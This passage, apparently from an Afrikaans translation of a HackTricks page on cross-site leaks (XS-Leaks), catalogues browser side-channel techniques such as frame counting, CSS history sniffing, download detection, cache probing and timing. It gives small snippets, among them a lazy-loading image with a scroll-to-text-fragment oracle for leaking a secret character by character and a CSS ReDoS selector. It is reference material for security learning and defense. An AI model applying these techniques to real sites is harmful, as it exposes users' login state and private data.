win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** Evalueer die hoeveelheid iframe-elemente deur die `window.length` eienskap te inspekteer.
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Tel die **aantal rame in 'n web** wat via `iframe` of `window.open` geopen is, kan help om die **status van die gebruiker oor daardie bladsy** te identifiseer.\
Boonop, as die bladsy altyd dieselfde aantal rame het, kan die **deurlopende** kontrole van die aantal rame help om 'n **patroon** te identifiseer wat inligting kan lek.

'n Voorbeeld van hierdie tegniek is dat in chrome, 'n **PDF** met **rame tel** gedetecteer kan word omdat 'n `embed` intern gebruik word. Daar is [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) wat 'n mate van beheer oor die inhoud toelaat soos `zoom`, `view`, `page`, `toolbar` waar hierdie tegniek interessant kan wees.

### HTMLElements

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** Lees die gelekte waarde om tussen 2 moontlike toestande te onderskei
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Inligtingslek deur HTML-elemente is 'n bekommernis in websekuriteit, veral wanneer dinamiese media-l√™ers gegenereer word op grond van gebruikersinligting, of wanneer watermerke bygevoeg word, wat die media-grootte verander. Dit kan deur aanvallers uitgebuit word om tussen moontlike toestande te onderskei deur die inligting wat deur sekere HTML-elemente blootgestel word, te analiseer.

### Information Exposed by HTML Elements

* **HTMLMediaElement**: Hierdie element onthul die media se `duration` en `buffered` tye, wat via sy API verkry kan word. [Lees meer oor HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Dit blootstel `videoHeight` en `videoWidth`. In sommige blaaiers is addisionele eienskappe soos `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, en `webkitDecodedFrameCount` beskikbaar, wat meer diepgaande inligting oor die media-inhoud bied. [Lees meer oor HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Hierdie funksie bied besonderhede oor video-afspeelkwaliteit, insluitend `totalVideoFrames`, wat die hoeveelheid video-data wat verwerk is, kan aandui. [Lees meer oor getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Hierdie element lek die `height` en `width` van 'n beeld. As 'n beeld egter ongeldig is, sal hierdie eienskappe 0 teruggee, en die `image.decode()` funksie sal verwerp word, wat dui op die mislukking om die beeld korrek te laai. [Lees meer oor HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** Identifiseer variasies in webwerf-styling wat verband hou met die gebruiker se toestand of status.
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Webtoepassings kan die **webwerf-styling verander op grond van die gebruiker se status**. Cross-origin CSS-l√™ers kan op die aanvallersbladsy met die **HTML skakel-element** ingesluit word, en die **re√´ls** sal op die aanvallersbladsy **toegepas** word. As 'n bladsy hierdie re√´ls dinamies verander, kan 'n aanvaller hierdie **verskille** opspoor, afhangende van die gebruiker se toestand.\
As 'n lek tegniek kan die aanvaller die `window.getComputedStyle` metode gebruik om **CSS** eienskappe van 'n spesifieke HTML-element te **lees**. As gevolg hiervan kan 'n aanvaller arbitr√™re CSS-eienskappe lees as die betrokke element en eienskapnaam bekend is.

### CSS History

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** Detecteer of die `:visited` styl toegepas is op 'n URL wat aandui dat dit reeds besoek is
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Volgens [**hierdie**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), werk dit nie in headless Chrome nie.
{% endhint %}

Die CSS `:visited` selektor word gebruik om URL's anders te styl as hulle voorheen deur die gebruiker besoek is. In die verlede kon die `getComputedStyle()` metode gebruik word om hierdie stylverskille te identifiseer. Modern blaaiers het egter sekuriteitsmaatre√´ls ge√Ømplementeer om te voorkom dat hierdie metode die toestand van 'n skakel onthul. Hierdie maatre√´ls sluit in dat die berekende styl altyd teruggegee word asof die skakel besoek is en dat die style wat met die `:visited` selektor toegepas kan word, beperk is.

Ten spyte van hierdie beperkings, is dit moontlik om die besoekte toestand van 'n skakel indirek te onderskei. Een tegniek behels om die gebruiker te mislei om met 'n area te interaksie wat deur CSS be√Ønvloed word, spesifiek die `mix-blend-mode` eienskap te gebruik. Hierdie eienskap laat die menging van elemente met hul agtergrond toe, wat moontlik die besoekte toestand kan onthul op grond van gebruikerinteraksie.

Verder kan opsporing bereik word sonder gebruikerinteraksie deur die weergawe-tyd van skakels te benut. Aangesien blaaiers besoekte en onbesoekte skakels anders kan weergee, kan dit 'n meetbare tydverskil in weergawe inbring. 'n Bewys van konsep (PoC) is in 'n Chromium-foutverslag genoem, wat hierdie tegniek demonstreer deur verskeie skakels te gebruik om die tydverskil te versterk, wat die besoekte toestand deur tydanalise opspoorbaar maak.

Vir verdere besonderhede oor hierdie eienskappe en metodes, besoek hul dokumentasiebladsye:

* `:visited`: [MDN Dokumentasie](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Dokumentasie](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Dokumentasie](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Headers
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** In Google Chrome, 'n toegewyde foutbladsy word vertoon wanneer 'n bladsy geblokkeer word om op 'n cross-origin webwerf ingebed te word weens X-Frame-Options beperkings.
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

In Chrome, as 'n bladsy met die `X-Frame-Options` kop wat op "deny" of "same-origin" gestel is, as 'n objek ingesluit word, verskyn 'n foutbladsy. Chrome keer 'n le√´ dokumentobjek (in plaas van `null`) vir die `contentDocument` eienskap van hierdie objek terug, anders as in iframes of ander blaaiers. Aanvallers kan dit uitbuit deur die le√´ dokument op te spoor, wat moontlik inligting oor die gebruiker se toestand kan onthul, veral as ontwikkelaars die X-Frame-Options kop inkonsekwent stel, dikwels die foutbladsye oor die hoof sien. Bewustheid en konsekwente toepassing van sekuriteitskoppe is van kardinale belang om sulke lekke te voorkom.

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** 'n Aanvaller kan l√™eraflaaie onderskei deur iframes te benut; voortgesette toegang tot die iframe dui op 'n suksesvolle l√™eraflaai.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Die `Content-Disposition` kop, spesifiek `Content-Disposition: attachment`, gee die blaaiers opdrag om inhoud af te laai eerder as om dit inline te vertoon. Hierdie gedrag kan uitgebuit word om te bepaal of 'n gebruiker toegang het tot 'n bladsy wat 'n l√™eraflaai inisieer. In Chromium-gebaseerde blaaiers is daar 'n paar tegnieke om hierdie aflaai gedrag te detecteer:

1. **Aflaai-balk Monitering**:
* Wanneer 'n l√™er in Chromium-gebaseerde blaaiers afgelaai word, verskyn 'n aflaai-balk onderaan die blaaiervenster.
* Deur veranderinge in die vensterhoogte te monitor, kan aanvallers die verskyning van die aflaai-balk aflei, wat daarop dui dat 'n aflaai inisieer is.
2. **Aflaai Navigasie met Iframes**:
* Wanneer 'n bladsy 'n l√™eraflaai inisieer met die `Content-Disposition: attachment` kop, veroorsaak dit nie 'n navigasie gebeurtenis nie.
* Deur die inhoud in 'n iframe te laai en vir navigasie gebeurtenisse te monitor, is dit moontlik om te kontroleer of die inhoudsdisposisie 'n l√™eraflaai veroorsaak (geen navigasie) of nie.
3. **Aflaai Navigasie sonder Iframes**:
* Soos die iframe tegniek, behels hierdie metode die gebruik van `window.open` in plaas van 'n iframe.
* Deur navigasie gebeurtenisse in die nuutgeopende venster te monitor, kan onthul word of 'n l√™eraflaai inisieer is (geen navigasie) of of die inhoud inline vertoon word (navigasie vind plaas).

In scenario's waar slegs ingelogde gebruikers sulke aflaaie kan inisieer, kan hierdie tegnieke gebruik word om indirek die gebruiker se verifikasietoestand af te lei op grond van die blaaiers se reaksie op die aflaai versoek.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** 'n Aanvaller kan l√™eraflaaie onderskei deur iframes te benut; voortgesette toegang tot die iframe dui op 'n suksesvolle l√™eraflaai.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (van [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Dit is waarom hierdie tegniek interessant is: Chrome het nou **cache partitioning**, en die cache sleutel van die nuutgeopende bladsy is: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, maar as ek 'n ngrok-bladsy oopmaak en fetch daarin gebruik, sal die cache sleutel wees: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, die **cache sleutel is anders**, so die cache kan nie gedeel word nie. Jy kan meer besonderhede hier vind: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Kommentaar van [**hier**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

As 'n webwerf `example.com` 'n hulpbron van `*.example.com/resource` insluit, sal daardie hulpbron die **dieselfde caching sleutel** h√™ asof die hulpbron direk **deur top-level navigasie aangevra** is. Dit is omdat die caching sleutel bestaan uit top-level _eTLD+1_ en frame _eTLD+1_.

Omdat toegang tot die cache vinniger is as om 'n hulpbron te laai, is dit moontlik om te probeer om die ligging van 'n bladsy te verander en dit 20ms (byvoorbeeld) daarna te kanselleer. As die oorsprong na die stop verander is, beteken dit dat die hulpbron in die cache was.\
Of kan net **'n paar fetch na die potensieel gekapte bladsy stuur en die tyd meet wat dit neem**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** Dit is moontlik om uit te vind of 'n antwoord op 'n fetch versoek 'n omleiding is
* **Code Example**:

![](<../.gitbook/assets/image (652).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** Dit is moontlik om te probeer om 'n hulpbron te laai en voordat dit gelaai word, word die laai onderbreek. Afhangende van of 'n fout geaktiveer word, was die hulpbron of nie in die cache nie.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Gebruik _**fetch**_ en _**setTimeout**_ met 'n **AbortController** om beide te detecteer of die **hulpbron in die cache is** en om 'n spesifieke hulpbron uit die blaaiers se cache te verwyder. Boonop vind die proses plaas sonder om nuwe inhoud te cache.

### Script Pollution

* **Inclusion Methods**: HTML Elements (script)
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** Dit is moontlik om **ingeboude funksies te oorskry** en hul argumente te lees, selfs van **cross-origin script** (wat nie direk gelees kan word nie), dit kan **waardevolle inligting lek**.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** Meet die uitvoeringstyd van 'n web met behulp van dienswerkers.
* **Code Example**:

In die gegewe scenario neem die aanvaller die inisiatief om 'n **dienswerker** binne een van hul domeine, spesifiek "attacker.com", te registreer. Vervolgens open die aanvaller 'n nuwe venster in die teikenwebwerf vanaf die hoofdokument en gee die **dienswerker** opdrag om 'n timer te begin. Terwyl die nuwe venster begin laai, navigeer die aanvaller die verwysing wat in die vorige stap verkry is na 'n bladsy wat deur die **dienswerker** bestuur word.

By die aankoms van die versoek wat in die vorige stap inisieer is, antwoord die **dienswerker** met 'n **204 (No Content)** statuskode, wat effektief die navigasieproses be√´indig. Op hierdie punt vang die **dienswerker** 'n meting van die timer wat vroe√´r in stap twee begin is. Hierdie meting word be√Ønvloed deur die duur van JavaScript wat vertragings in die navigasieproses veroorsaak.

{% hint style="warning" %}
In 'n uitvoeringstyd is dit moontlik om **netwerkfaktore** te **elimineer** om **meer presiese metings** te verkry. Byvoorbeeld, deur die hulpbronne wat deur die bladsy gebruik word, te laai voordat dit gelaai word.
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** Gebruik [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) om die tyd te meet wat dit neem om 'n versoek te doen. Ander horlosies kan gebruik word.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** Gebruik [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) om die tyd te meet wat dit neem om 'n versoek te doen met `window.open`. Ander horlosies kan gebruik word.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkvloei** te outomatiseer wat deur die w√™reld se **mees gevorderde** gemeenskapsinstrumente aangedryf word.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## With HTML or Re Injection

Hier kan jy tegnieke vind om inligting uit 'n cross-origin HTML **te injecteer**. Hierdie tegnieke is interessant in gevalle waar jy om enige rede **HTML kan injecteer maar jy kan nie JS-kode injecteer nie**.

### Dangling Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

As jy **inhoud moet uitlek** en jy kan **HTML voor die geheim byvoeg**, moet jy die **gewone dangling markup tegnieke** nagaan.\
As jy egter om enige rede **MOET** dit **karakter vir karakter** doen (miskien is die kommunikasie via 'n cache hit), kan jy hierdie truuk gebruik.

**Beelde** in HTML het 'n "**loading**" attribuut waarvan die waarde "**lazy**" kan wees. In daardie geval sal die beeld gelaai word wanneer dit gesien word en nie terwyl die bladsy laai nie:
```html
<img src=/something loading=lazy >
```
Daarom, wat jy kan doen, is om **'n baie groot hoeveelheid rommelkarakters** (Byvoorbeeld **duisende "W"s**) toe te voeg om **die webblad te vul voor die geheim of iets soos** `<br><canvas height="1850px"></canvas><br>.`\
Dan, as ons **inspuiting byvoorbeeld voor die vlag verskyn**, sal die **beeld** **gelaai** word, maar as dit **na** die **vlag** verskyn, sal die vlag + die rommel **voorkom dat dit gelaai word** (jy sal moet speel met hoeveel rommel om te plaas). Dit is wat gebeur het in [**hierdie skrywe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

'n Ander opsie sou wees om die **scroll-to-text-fragment** te gebruik as dit toegelaat word:

#### Scroll-to-text-fragment

Maar jy laat die **bot toegang tot die bladsy** maak met iets soos
```
#:~:text=SECR
```
So die webblad sal iets soos wees: **`https://victim.com/post.html#:~:text=SECR`**

Waar post.html die aanvaller se rommelkarakters en lui laai beeld bevat en dan die geheim van die bot bygevoeg word.

Wat hierdie teks sal doen, is om die bot toegang te gee tot enige teks op die bladsy wat die teks `SECR` bevat. Aangesien daardie teks die geheim is en dit net **onder die beeld** is, sal die **beeld slegs laai as die geraamde geheim korrek is**. So daar het jy jou orakel om **die geheim karakter vir karakter te exfiltreer**.

'n Voorbeeld van kode om dit te benut: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Beeld Lui Laai Tyd Gebaseer

As dit **nie moontlik is om 'n eksterne beeld te laai nie** wat die aanvaller kan aandui dat die beeld gelaai is, kan 'n ander opsie wees om te probeer om **die karakter verskeie kere te raai en dit te meet**. As die beeld gelaai is, sal al die versoeke langer neem as wanneer die beeld nie gelaai is nie. Dit is wat in die [**oplossing van hierdie skrywe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **samengevat is hier:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

As `jQuery(location.hash)` gebruik word, is dit moontlik om uit te vind via tyd **of sommige HTML-inhoud bestaan**, dit is omdat as die selektor `main[id='site-main']` nie ooreenstem nie, hoef dit nie die res van die **selektore** te kontroleer nie:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defenses

Daar is verskeie versagings aanbeveel in [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ook in elke afdeling van die wiki [https://xsleaks.dev/](https://xsleaks.dev/). Kyk daar vir meer inligting oor hoe om teen hierdie tegnieke te beskerm.

## References

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Kyk na die [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) of die [**telegram group**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **automate workflows** aangedryf deur die w√™reld se **mees gevorderde** gemeenskapstoestelle.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
